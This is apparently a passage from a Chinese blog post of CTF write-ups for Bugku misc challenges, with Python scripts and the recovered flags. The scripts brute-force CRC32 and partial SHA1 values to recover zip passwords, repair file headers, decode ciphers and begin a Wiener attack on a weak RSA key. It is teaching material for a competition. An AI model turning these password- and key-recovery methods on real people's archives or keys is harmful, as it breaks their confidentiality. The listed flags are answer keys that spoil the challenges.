class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/12 0:42</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : RGB转jpg.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description : </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">r'E:\CTF\misc\Bugku\1 (1).txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">        rgb = line.split(<span class="string">","</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line"><span class="comment"># im.save('qqq.jpg')</span></span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785102381.png" alt="1526785102381"></p><blockquote><p>flag{youc@n’tseeme}</p></blockquote><h2 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h2><p>UE查看，开头是50 4B 03 04 ，zip的文件头</p><p>加上zip后缀，解压出一丢图片</p><p>iscc的脑洞题，不想做了，放下表哥的writeup</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="noopener">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="noopener">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><blockquote><p>flag{y0ud1any1s1}</p></blockquote><h2 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h2><p>123.zip里有68个压缩包，每个压缩包里都有个data.txt，大小只有4，应该就是CRC32碰撞了</p><p>代码在python2.7环境下运行，跑得有点久</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 12:43</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : CRC32碰撞.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment"># print s</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">r'E:\CTF\misc\Bugku\123\out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">r'E:\CTF\misc\Bugku\123\out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到碰撞出来的值，</p><blockquote><p>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</p></blockquote><p>base64解码后转为16进制</p><p>注意不能找在线的base64解码，会漏掉00。16进制保存在winhex里</p><blockquote><p>cf90 7300 000d 0000 0000 0000 00aa 3e7a<br>0080 2300 4900 0000 5400 0000 0286 34ab<br>fe6b 631d 491d 3303 0001 0000 0043 4d54<br>0915 14cb dd41 4f95 2448 d3e8 8f98 4511<br>5141 46f7 9f1d 2042 7c6d 2bb8 69ca 9f28<br>2c33 28fc 4816 991f 1b18 1d8f 382c 4676<br>e1c5 ed67 4d72 de4d 4ad5 8274 be92 bd1f<br>0a94 cdbe aef7 3f22 804a f774 2090 2d00<br>1d00 0000 1d00 0000 0262 d1e7 d54f 631d<br>491d 3008 0020 0000 0066 6c61 672e 7478<br>7400 b034 6966 6669 7820 7468 6520 6669<br>6c65 2061 6e64 2067 6574 2074 6865 2066<br>6c61 67c4 3d7b 0040 0700 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 14:05</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-base64解码.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">r'E:\CTF\misc\Bugku\123\out.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">text = base64.b64decode(s)</span><br><span class="line">print(text)</span><br><span class="line">ff = open(<span class="string">r'E:\CTF\misc\Bugku\123\rrr.txt'</span>, <span class="string">'wb'</span>)</span><br><span class="line">ff.write(text)</span><br><span class="line">f.close()</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><p>可以看到<code>fix the file and get the flag</code>得知我们需要修复文件就可以得到flag：</p><p> <img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796798904.png" alt="1526796798904"></p><p>我们知道C4 3D 7B 00 40 07 00为rar文件的十六进制结尾，所以我们需要在文件头部添加rar文件的十六进制头52 61 72 21 1A 07 00，然后另存为rar文件。打开rar文件，在注释中得到flag： </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796711735.png" alt="1526796711735"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796865616.png" alt="1526796865616"></p><blockquote><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p></blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/WangAoBo/p/6951160.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6951160.html</a></p><h2 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h2><p>解压有flag.rar，flag.rar解压有个flag.txt，flag.txt显示flag is not here</p><p>找writeup，修改下图圈出来的为74</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526792542138.png" alt="1526792542138"></p><p>这时候发现flag.rar有个secret.png</p><p>png查看16进制，发现是GIF开头，改为gif后缀，2345看图王分解为两帧，然而2345看图王分解的帧用stegsolve看不到二维码，后来用firework弄两个gif，一个gif删去状态1，一个gif删除状态2</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796957091.png" alt="1526796957091"></p><p>用windows自带的画图工具拼接起来</p><p>上面左边和右边的角缺失了，可以拿左下角的复制过去补一补</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526797486238.png" alt="1526797486238"></p><blockquote><p>flag{yanji4n_bu_we1shi}  </p></blockquote><p>参考：<a href="https://www.cnblogs.com/blili/p/9013555.html" target="_blank" rel="noopener">https://www.cnblogs.com/blili/p/9013555.html</a></p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><blockquote><p>想要妹子陌陌号吗？<br>做题来拿吧</p><p>下载这个图片做题</p><p><a href="http://120.24.86.145:8002/misc/momo.jpg" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/momo.jpg</a></p></blockquote><p>虽然今天520对我来说没关系，但我一定要贴这个题目的妹子出来</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785441283.png" alt="1526785441283"></p><p>binwalk发现有RAR，分解出来，RAR需要密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785587525.png" alt="1526785587525"></p><p>尝试多种方法解密不成功，看看大佬writeup，密码就是妹子图片红色字:喜欢我吗.</p><p>momo.txt</p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>····/-/-/·–·/—···/-··-·/-··-·/·/-·/-·-·/—/-··/·/·-·-·-/-·-·/····/·-/····/··-/—/·-·-·-/-·-·/—/–/-··-·</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="noopener">http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526786983633.png" alt="1526786983633"></p><p>摩斯密码解密得一个网址</p><blockquote><p><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p></blockquote><p>打开一看是一个解密的，再看看</p><blockquote><p><a href="http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="noopener">http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a></p><p>AES Key：@#@#￥%……￥￥%%……&amp;￥</p></blockquote><p>拿网址U2F这串字符去AES解密，得momoj2j.png</p><p>访问</p><blockquote><p><a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="noopener">http://c.bugku.com/momoj2j.png</a></p></blockquote><p>看到一个二维码，一看就是黑白反转了</p><p>拿stegsolve反转一下，扫描二维码得</p><blockquote><p>KEY{nitmzhen6}  </p></blockquote><h2 id="就五层你能解开吗"><a href="#就五层你能解开吗" class="headerlink" title="就五层你能解开吗"></a>就五层你能解开吗</h2><blockquote><p>链接: <a href="http://pan.baidu.com/s/1i4TQoz7" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4TQoz7</a> 密码: w65m</p><p>提示：</p><p>第一层：CRC32 碰撞</p><p>第二层：维吉尼亚密码</p><p>第三层：sha1 碰撞</p><p>第四层：md5 相同文件不同</p><p>第五层：RSA</p></blockquote><h3 id="第一层-CRC32-碰撞"><a href="#第一层-CRC32-碰撞" class="headerlink" title="第一层  CRC32 碰撞"></a>第一层  CRC32 碰撞</h3><p>打开压缩包，发现大小都为6，可以用CRC32碰撞，大于6的基本不要用CRC32碰撞了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799814333.png" alt="1526799814333"></p><p>碰撞脚本：<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">https://github.com/theonlypwner/crc32</a></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799929576.png" alt="1526799929576"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799897601.png" alt="1526799897601"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799909515.png" alt="1526799909515"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799918380.png" alt="1526799918380"></p><p>从里面选取有意义的字符串连接起来。发现可以连成</p><blockquote><p>_CRC32_i5_n0t_s4f3</p></blockquote><p>输入密码解压。解压成功。</p><h3 id="第二层-维吉尼亚密码"><a href="#第二层-维吉尼亚密码" class="headerlink" title="第二层  维吉尼亚密码"></a>第二层  维吉尼亚密码</h3><blockquote><p>你知道维吉尼亚密码吗？<br>我们给了keys.txt，唯一的密钥就在其中，那么解密ciphertext.txt里的密文吧！<br>解压密码就在明文里，祝你好运！</p><p>Do you know the Vigenére Ciphers?<br>We gave the keys.txt, Only have a key in it, So decrypts ciphertext.txt!<br>Unzip Password in plaintext, good luck to you!</p></blockquote><blockquote><p>在线爆破vigenere ：<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526800422226.png" alt="1526800422226"></p><p>但不对，在key里面找一找类似的 （直接writeup拿了）</p><blockquote><p>YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV</p></blockquote><p><a href="http://tool.bugku.com/jiemi/解密得" target="_blank" rel="noopener">http://tool.bugku.com/jiemi/解密得</a></p><blockquote><p>the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny</p></blockquote><p>解压密码</p><blockquote><p> vigenere cipher funny</p></blockquote><h3 id="第三层：sha1-碰撞"><a href="#第三层：sha1-碰撞" class="headerlink" title="第三层：sha1 碰撞"></a>第三层：sha1 碰撞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">恭喜!</span><br><span class="line"></span><br><span class="line">现在我们遇到一个问题,我们有一个zip文件,但我们不知道完整的解压密码。</span><br><span class="line">幸好我们知道解压密码的一部分sha1值。</span><br><span class="line">你能帮我们找到的密码吗?</span><br><span class="line"></span><br><span class="line">不完整的密码：&quot;*7*5-*4*3?&quot;  *代表可打印字符</span><br><span class="line"></span><br><span class="line">不完整的sha1：&quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot;  *代表可打印字符</span><br><span class="line"></span><br><span class="line">人生苦短，我用Python。</span><br><span class="line"></span><br><span class="line">Congratulations!</span><br><span class="line">Now we run into a problem,We have a zip file, but we don&apos;t know the complete unzip password.</span><br><span class="line">Fortunately, we know that part of the unzip password of sha1 value.</span><br><span class="line">can you help us to find the password?</span><br><span class="line"></span><br><span class="line">Incomplete password is &quot;*7*5-*4*3?&quot;   * in the range of ASCII printable characters</span><br><span class="line"></span><br><span class="line">Incomplete sha1 is &quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot;    * in the range of ASCII printable characters</span><br><span class="line"></span><br><span class="line">Life is short, you need Python.</span><br></pre></td></tr></table></figure><p>那就上脚本把。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+&#123;&#125;:&lt;&gt;?."</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> dic:</span><br><span class="line">                fir = <span class="string">'*7*5-*4*3?'</span></span><br><span class="line">                poc = i1+<span class="string">'7'</span>+i2+<span class="string">'5-'</span>+i3+<span class="string">'4'</span>+i4+<span class="string">'3?'</span></span><br><span class="line">                <span class="comment"># print('%s'%(poc))</span></span><br><span class="line">                dest = <span class="string">'619c20c'</span></span><br><span class="line">                next  =hashlib.sha1(poc.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                <span class="keyword">if</span> str(next).startswith(dest):</span><br><span class="line">                    print(poc+<span class="string">'    '</span>+next)</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526801565250.png" alt="1526801565250"></p><p>解压密码</p><blockquote><p>I7~5-s4F3?</p></blockquote><h3 id="第四层：md5-相同文件不同"><a href="#第四层：md5-相同文件不同" class="headerlink" title="第四层：md5 相同文件不同"></a>第四层：md5 相同文件不同</h3><blockquote><p>Hello World ;-)<br>MD5校验真的安全吗？<br>有没有两个不同的程序MD5却相同呢？<br>如果有的话另一个程序输出是什么呢？<br>解压密码为单行输出结果。</p><p>Hello World ;-)<br>MD5 check is really safe?<br>There are two different procedures MD5 is the same?<br>If so what is the output of another program?<br>The decompression password is a single-line output.</p></blockquote><p><a href="https://blog.csdn.net/liangkwok/article/details/7441867" target="_blank" rel="noopener">https://blog.csdn.net/liangkwok/article/details/7441867</a></p><p><a href="https://blog.csdn.net/sysprogram/article/details/73753354" target="_blank" rel="noopener">https://blog.csdn.net/sysprogram/article/details/73753354</a></p><p>摘录</p><blockquote><p>两个程序的文件内容不一样，运行的效果打印的东西不一样，一个打印循环打印Goodbye World，一个只打印Hello world。但是md5却一样。 </p></blockquote><p>于是解压密码为</p><blockquote><p>Goodbye World :-( </p></blockquote><h3 id="第五层：RSA"><a href="#第五层：RSA" class="headerlink" title="第五层：RSA"></a>第五层：RSA</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526801812916.png" alt="1526801812916"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; openssl rsa -pubin -text -modulus -in rsa_public_key.pem</span><br><span class="line">Public-Key: (1026 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    02:8f:ff:9d:d3:e6:fe:97:81:64:9e:b7:fe:5e:93:</span><br><span class="line">    03:cf:69:63:47:c4:11:0b:c4:ba:39:69:f0:b1:16:</span><br><span class="line">    69:84:0c:51:d8:1a:68:42:b6:df:2b:09:0f:21:cd:</span><br><span class="line">    76:d4:37:1a:8c:0e:47:04:8c:96:5e:ca:5b:46:91:</span><br><span class="line">    3a:fb:b8:da:05:20:72:a0:56:6d:70:39:c6:18:ab:</span><br><span class="line">    a9:06:57:59:b0:59:e2:9e:48:5d:c5:06:1a:16:ac:</span><br><span class="line">    63:12:94:38:d9:35:4e:65:df:57:47:54:6b:85:db:</span><br><span class="line">    3d:69:98:19:c4:b7:73:2d:f9:27:c7:08:4a:5d:52:</span><br><span class="line">    d6:e6:d6:aa:c1:44:62:34:25</span><br><span class="line">Exponent:</span><br><span class="line">    01:f8:fb:a4:10:05:2d:f7:ed:a3:46:2f:1a:ac:d6:</span><br><span class="line">    9e:40:76:04:33:ca:33:57:67:cd:73:05:a3:d0:90:</span><br><span class="line">    80:5a:5f:d4:05:dd:6e:ea:70:e9:8f:0c:a1:e1:cf:</span><br><span class="line">    25:47:48:67:1b:f0:c9:80:06:c2:0e:ee:1d:62:79:</span><br><span class="line">    04:35:09:fe:7a:98:23:8b:43:91:60:a5:61:2d:a7:</span><br><span class="line">    1e:90:45:14:e8:12:80:61:7e:30:7c:3c:d3:31:3f:</span><br><span class="line">    a4:c6:fc:a3:31:59:d0:44:1f:bb:18:d8:3c:af:4b:</span><br><span class="line">    d4:6f:6b:92:97:a8:0a:14:2d:d6:9b:f1:a3:57:cc:</span><br><span class="line">    b5:e4:c2:00:b6:d9:0f:15:a3</span><br><span class="line">Modulus=28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQKP/53T5v6XgWSet/5ekwPP</span><br><span class="line">aWNHxBELxLo5afCxFmmEDFHYGmhCtt8rCQ8hzXbUNxqMDkcEjJZeyltGkTr7uNoF</span><br><span class="line">IHKgVm1wOcYYq6kGV1mwWeKeSF3FBhoWrGMSlDjZNU5l31dHVGuF2z1pmBnEt3Mt</span><br><span class="line">+SfHCEpdUtbm1qrBRGI0JQKBgQH4+6QQBS337aNGLxqs1p5AdgQzyjNXZ81zBaPQ</span><br><span class="line">kIBaX9QF3W7qcOmPDKHhzyVHSGcb8MmABsIO7h1ieQQ1Cf56mCOLQ5FgpWEtpx6Q</span><br><span class="line">RRToEoBhfjB8PNMxP6TG/KMxWdBEH7sY2DyvS9Rva5KXqAoULdab8aNXzLXkwgC2</span><br><span class="line">2Q8Vow==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>发现e很大，想到RSA的维纳攻击</p><p>github找了好几个，终于找到个能用的</p><p><a href="https://github.com/orisano/owiener" target="_blank" rel="noopener">https://github.com/orisano/owiener</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 15:55</span></span><br><span class="line"><span class="comment"># @Author  : 